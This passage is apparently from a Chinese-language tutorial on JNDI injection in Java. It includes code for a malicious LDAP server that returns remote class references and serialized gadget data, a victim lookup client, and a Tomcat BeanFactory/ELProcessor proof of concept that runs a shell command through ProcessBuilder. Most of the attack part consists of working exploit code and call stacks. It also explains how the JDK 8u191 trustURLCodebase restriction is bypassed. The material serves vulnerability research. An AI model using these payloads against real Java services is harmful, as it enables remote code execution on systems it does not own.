            }
            protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if (refPos > 0) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }
    }
这里还是用上面RMI那里的web服务器来加载字节码
被攻击者代码
        public static void main(String[] args) {
            try {
                String uri = "ldap://127.0.0.1:9999/calc";
                Context ctx = new InitialContext();
                ctx.lookup(uri);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
这里使用jdk`1.8.0_181`版本运行之后,/tmp/目录下四个文件都会被创建,调用的过程和JNDI
RMI那块一样的,先解析协议,获取ldap协议的对象,寻找Reference中的factoryName对象,先尝试本地加载这个类,本地没有这个类用URLClassLoader远程进行加载...
列下调用栈
    loadClass:72, VersionHelper12 (com.sun.naming.internal)
    loadClass:87, VersionHelper12 (com.sun.naming.internal)
    getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
    getObjectInstance:189, DirectoryManager (javax.naming.spi)
    c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:45, HelloClient
把JDK换成`1.8.0_241`版本运行看下,会发现/tmp/目录下的文件并没有创建成功,DEBUG看下.
`com.sun.naming.internal.VersionHelper12#loadClass`
101行判断了`trustURLCodebase`等于true才可以加载远程对象,而`trustURLCodebase`的默认值是false
在jdk`11.0.1`、`8u191`、`7u201`、`6u211`版本开始默认com.sun.jndi.ldap.object.trustURLCodebase设置为false,ldap加载远程的字节码不会执行成功。
#### 8u191之后
##### 使用本地的Reference Factory类
在`jdk8u191`之后RMI和LDAP默认都不能从远程加载类,还是可以在RMI和LDAP中获取对象。在前面我们分析过`javax.naming.spi.NamingManager#getObjectFactoryFromReference`方法,会先从本地的CLASSPATH中寻找该类,如果没有才会去远程加载。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference
Factory类并且在这四个地方其中一块能执行payload就可以了。Michael
Stepankin师傅在tomcat中找到`org.apache.naming.factory.BeanFactory#getObjectInstance`来进行利用。
tomcat
jar下载地址
先看下poc
                Registry registry = LocateRegistry.createRegistry(1099);
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));
                ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()\")"));
                ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
                registry.bind("calc", referenceWrapper);
DEBUG看下漏洞原因
`org.apache.naming.factory.BeanFactory#getObjectInstance`
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws NamingException {
            if (obj instanceof ResourceRef) {
                NamingException ne;
                try {
                    Reference ref = (Reference)obj;
                    // 获取到的是javax.el.ELProcessor
                    String beanClassName = ref.getClassName();
                    Class beanClass = null;
                    ClassLoader tcl = Thread.currentThread().getContextClassLoader();
                    if (tcl != null) {
                        try {
                                // 加载javax.el.ELProcessor类
                            beanClass = tcl.loadClass(beanClassName);
                        } catch (ClassNotFoundException var26) {
                        }
                    } else {
                        ...
                    }
                    if (beanClass == null) {
                        throw new NamingException("Class not found: " + beanClassName);
                    } else {
                        BeanInfo bi = Introspector.getBeanInfo(beanClass);
                        PropertyDescriptor[] pda = bi.getPropertyDescriptors();
                        Object bean = beanClass.newInstance();
                        //获取forceString属性的值{Type: forceString,Content: x=eval}
                        RefAddr ra = ref.get("forceString");
                        Map forced = new HashMap();
                        String value;
                        String propName;
                        int i;
                        if (ra != null) {
                            value = (String)ra.getContent();
                            Class[] paramTypes = new Class[]{String.class};
                            String[] arr$ = value.split(",");
                            i = arr$.length;
                            for(int i$ = 0; i$ = 0) {
                                        //eval  
                                    propName = param.substring(index + 1).trim();
                                    //x
                                    param = param.substring(0, index).trim();
                                } else {
                                    propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                                }
                                try {
                                    //x=(ELProcessor.getMethod("eval",String[].class))
                                    forced.put(param, beanClass.getMethod(propName, paramTypes));
                                } catch (SecurityException | NoSuchMethodException var24) {
                                    ...
                                }
                            }
                        }
                        Enumeration e = ref.getAll();
                        while(true) {
                            ...
                                                            // "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()")
                                value = (String)ra.getContent();
                                Object[] valueArray = new Object[1];
                                //eval method...
                                Method method = (Method)forced.get(propName);
                                if (method != null) {
                                    valueArray[0] = value;
                                    try {
                                            //反射执行ELProcessor.eval方法
                                        method.invoke(bean, valueArray);
                                    } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
                                        throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);
                                    }
                                } else {
                                    ...
                                }
                            }
                        }
                    }
                }
                ...
        }
我在这个类上面加了一些注释,ELProcessor.eval()会对EL表达式进行处理,最后会执行。
    "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()")
##### 使用序列化数据,触发本地Gadget
`com.sun.jndi.ldap.Obj#decodeObject`
这里可以看到在LDAP中数据可以是序列化对象也可以是Reference对象。如果是序列化对象会调用deserializeObject方法
`com.sun.jndi.ldap.Obj#deserializeObject`
该方法就是把byte用ObjectInputStream对数据进行反序列化还原。那么传输序列化对象的payload,客户端在这里就会进行触发.
改造下LDAP SERVER即可
            protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
                e.addAttribute("javaClassName", "foo");
                //getObject获取Gadget
                e.addAttribute("javaSerializedData", serializeObject(getObject(this.cmd)));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
调用链
    readObject:1170, Hashtable (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2232, ObjectInputStream (java.io)
    readOrdinaryObject:2123, ObjectInputStream (java.io)
    readObject0:1624, ObjectInputStream (java.io)
    readObject:464, ObjectInputStream (java.io)
    readObject:422, ObjectInputStream (java.io)
    deserializeObject:531, Obj (com.sun.jndi.ldap)
    decodeObject:239, Obj (com.sun.jndi.ldap)
    c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:43, HelloClient
### 四、总结
JNDI注入漏洞很常见,在`fastjson`/`jackson`中会调用getter/setter方法,如果在getter/setter方法中存在lookup方法并且参数可控就可以利用,可以看下`jackson`的黑名单来学习哪些类可以拿来JNDI注入。在`weblogic
t3`协议中基于序列化数据传输,那么会自动调用readObject方法,`weblogic`使用了`Spring`框架`JtaTransactionManager`类,这个类的readObject方法也存在JNDI注入调用链。
### 参考链接
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
* * *